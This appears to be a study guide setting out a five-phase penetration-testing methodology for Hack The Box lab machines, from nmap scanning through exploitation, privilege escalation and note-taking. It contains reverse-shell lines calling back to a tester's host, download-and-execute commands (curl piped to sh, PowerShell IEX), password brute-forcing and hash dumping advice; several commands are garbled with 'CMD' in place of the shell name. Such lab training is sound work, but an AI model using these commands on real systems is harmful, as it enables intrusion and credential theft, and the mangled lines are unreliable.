
         The Structured Penetration Testing Methodology


This methodology is divided into five core phases, following a standard like PTES (Penetration Testing Execution Standard) or OSCP's approach.

1.  Information Gathering & Reconnaissance
2.  Threat Modeling & Enumeration
3.  Exploitation & Initial Access
4.  Post-Exploitation & Privilege Escalation
5.  Documentation & Learning

---

 Phase 1: Information Gathering & Reconnaissance

Goal: To understand the target's attack surface without touching it directly. We need to find all possible doors and windows.

 Step 1.1: Initial Target Engagement
   Add to hosts file: This ensures you can use the machine name (e.g.,apparel.htb) instead of just the IP.
   CMD  
    echo "10.10.10.XXX    apparel.htb" | sudo tee -a /etc/hosts
   

 Step 1.2: Passive Reconnaissance
   Check if the machine has a public write-up or hints. (Do this after you've tried yourself to avoid spoilers!).

 Step 1.3: Active Reconnaissance - Network Scanning
   Full TCP Port Scan: Discovers all open TCP ports. This is your first major discovery.
   CMD  
     Classic, detailed output
    sudo nmap -sC -sV -O -p- -oA tcp_full apparel.htb

     Faster, more aggressive scan (use with caution on real engagements)
    sudo nmap --min-rate 5000 --max-retries 1 -p- -oA tcp_ports_fast apparel.htb
   
      -sC: Run default scripts.
      -sV: Probe open ports to determine service/version info.
      -O: Enable OS detection.
      -p-: Scan all 65535 ports.
      -oA: Output in all formats (normal, XML, grepable).

   UDP Port Scan: Often skipped but crucial. It's slow, so target top ports.
   CMD  
    sudo nmap -sU --top-ports 100 -oA udp_top_100 apparel.htb
   

   Analyze Nmap Results:
   CMD  
     Extract just the open ports for further scanning
    grep "open" tcp_full.nmap | awk -F'/' '{print $1}' ORS=','
     Use the output (e.g., 80,443,8080) for a detailed scan on just those ports
    sudo nmap -sC -sV -p 80,443,8080 -oA tcp_detail apparel.htb
   

---

 Phase 2: Threat Modeling & Enumeration

Goal: To deeply understand the services found in Phase 1 and identify potential vulnerabilities.

 Step 2.1: Service-Specific Enumeration

   HTTP/HTTPS (Web Servers - Port 80/443/8080/etc.)
       Manual Inspection:
       CMD  
         Open in browser
        firefox http://apparel.htb:8080 &

         Check for robots.txt, .git exposure, etc.
        curl http://apparel.htb/robots.txt
       
       Automated Directory/File Brute-Forcing:
       CMD  
        gobuster dir -u http://apparel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scan.txt
         For virtual hosts
        gobuster vhost -u http://apparel.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o vhost_scan.txt
       
       Framework/CMS Identification:
       CMD  
        whatweb http://apparel.htb
        wappalyzer http://apparel.htb  (Browser Extension)
       
       Nikto Scan: (Can be noisy)
       CMD  
        nikto -h http://apparel.htb
       

   SMB (Ports 139/445)
       List Shares:
       CMD  
        smbclient -L //apparel.htb -N
       
       Connect to a Share:
       CMD  
        smbclient //apparel.htb/ShareName -N
       
       Enum4linux (Classic SMB Enumeration):
       CMD  
        enum4linux-ng apparel.htb -A -oA enum4linux_output
       

   FTP (Port 21)
       Anonymous Login:
       CMD  
        ftp apparel.htb
         Username: anonymous
         Password: (press enter)
       

   SSH (Port 22)
       Banner Grabbing & Version Enumeration:
       CMD  
        nc -nv apparel.htb 22
       

   DNS (Port 53) - if it's a DNS server itself
       Zone Transfer:
       CMD  
        dig @apparel.htb apparel.htb AXFR
       

 Step 2.2: Vulnerability Scanning
   Searchsploit: Search for public exploits for the services/versions you found.
   CMD  
    searchsploit "Apache 2.4.50"
    searchsploit "OpenSSH 8.2"
   
   Nmap Vuln Scripts:
   CMD  
    nmap --script vuln -p 80,445 apparel.htb
   

---

 Phase 3: Exploitation & Initial Access

Goal: To leverage the identified vulnerabilities to gain an initial foothold on the target.

 Step 3.1: Exploit Selection & Modification
   Find Exploits: Use the results from Searchsploit, Google, and Exploit-DB.
   Download Exploit:
   CMD  
    searchsploit -m 49757  Example ID
   
   Analyze the Code: Never run an exploit blindly. Understand what it does.
   Modify: Change parameters likerhost,lhost,lport, file paths, etc.

 Step 3.2: Gaining a Shell
   Web Exploits (e.g., File Upload, SQLi, RCE):
       SQLi to dump credentials, login, and upload a web shell.
       Command Injection to execute a reverse shell command.
   Service Exploits (e.g., SMB, FTP):
       Use a metasploit module or a public Python exploit.
   Password Attacks:
       Hydra for Brute-Force:
       CMD  
        hydra -l admin -P /usr/share/wordlists/rockyou.txt apparel.htb http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
       

 Step 3.3: Establishing a Stable Shell
   Spawning a TTY Shell: Many exploits give a limited shell.
   CMD  
     Python
    python3 -c 'import pty; pty.spawn("/bin/CMD  ")'

     Socat (Most stable - requires a binary on the target)
     On your machine: socat file:tty,raw,echo=0 tcp-listen:4444
     On the target: socat TCP:10.10.14.X:4444 EXEC:"CMD   -li",pty,stderr,setsid,sigint,sane
   

---

 Phase 4: Post-Exploitation & Privilege Escalation

Goal: To move from a low-privileged user (www-data,user) to the highest privilege (root/NT AUTHORITY\SYSTEM).

 Step 4.1: Stabilization & Situational Awareness
   Who am I?
   CMD  
    id
    whoami
   
   What system is this?
   CMD  
    uname -a
    cat /etc/issue
    cat /etc/release
   
   What's running?
   CMD  
    ps aux
    netstat -tulpn
    ss -tulpn
   

 Step 4.2: Automated Enumeration Scripts
   Linux:
   CMD  
     LinPEAS is the gold standard
     Transfer it to the target (using python3 -m http.server on your machine)
    curl http://10.10.14.X:8000/linpeas.sh | sh

     Linux Smart Enumeration (LSE)
    ./lse.sh
   
   Windows:
   powershell
     WinPEAS
    .\winpeas.exe

     PowerSploit's PowerUp
    IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/PowerUp.ps1'); Invoke-AllChecks
   

 Step 4.3: Manual Privilege Escalation Checks
   Linux:
       Sudo Rights:
       CMD  
        sudo -l
       
       SUID Binaries:
       CMD  
        find / -perm -u=s -type f 2>/dev/null
       
       Cron Jobs:
       CMD  
        cat /etc/crontab
        crontab -l
       
       Kernel Exploits:
       CMD  
         Use the 'uname -a' info to search for exploits
        searchsploit "Linux Kernel 5.4"
       
   Windows:
       User Information:
       cmd
        whoami /priv
        whoami /groups
       
       Services:
       cmd
        sc query
        accesschk.exe -uwcqv "Everyone" 
       
       AlwaysInstallElevated:
       cmd
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
       

 Step 4.4: Lateral Movement (if needed)
   Dump hashes (/etc/shadow, SAM database) and try to reuse them on other services or users (Pass-the-Hash).

---

 Phase 5: Documentation & Learning

Goal: To solidify your knowledge and create a reportable record of the attack path.

 Step 5.1: Proof
   Capture the flags:
   CMD  
    cat /root/root.txt
    cat /home/user/user.txt
   

 Step 5.2: Create Your Own Notes
   For every machine, create a Markdown file. Structure it with the phases above.
   Example Template:
   markdown
     HTB - [Machine Name]

     Executive Summary
    [Brief description of the attack path]

     Phase 1: Recon
       IP: 10.10.10.XXX
       Ports:nmap -p- ...
       Key Services: ...

     Phase 2: Enumeration
       Web:gobuster dir ... found/admin
       SMB:smbclient ... found anonymous access toShareX

     Phase 3: Exploitation
       Vulnerability: RCE incontact.php
       Exploit:curl http://.../cmd.php?cmd=whoami
       Shell:nc -lvnp 4444 ->CMD   -c 'CMD   -i >& /dev/tcp/10.10.14.X/4444 0>&1'

     Phase 4: Privilege Escalation
       User -> Root: Via SUIDfind command
       Command:./find . -exec /bin/sh -p \; -quit

     Commands & Payloads
    [Store all your successful commands here for quick reference later]
   

 Step 5.3: Clean Up
   Remove any tools, scripts, or shells you uploaded.
   Exit your sessions.

---

 Pro-Tips for Your Methodology

1.  Keep a Custom Wordlist: As you solve machines, note down common paths (/admin,/backup,/test) and build your own wordlist.
2.  Organize Your Workspace: Have a folder for each machine. Usetmux orscreen to manage multiple terminals.
3.  Never Give Up: The "try harder" mentality is key. If one path fails, go back to enumeration. There's always something you missed.
4.  Practice Makes Perfect: The more machines you solve with this methodology, the more it will become second nature. You'll start to develop an intuition for where to look.

By following this structured approach, you will not only solve HTB machines more efficiently but also build the foundational skills needed for real-world penetration testing. Good luck
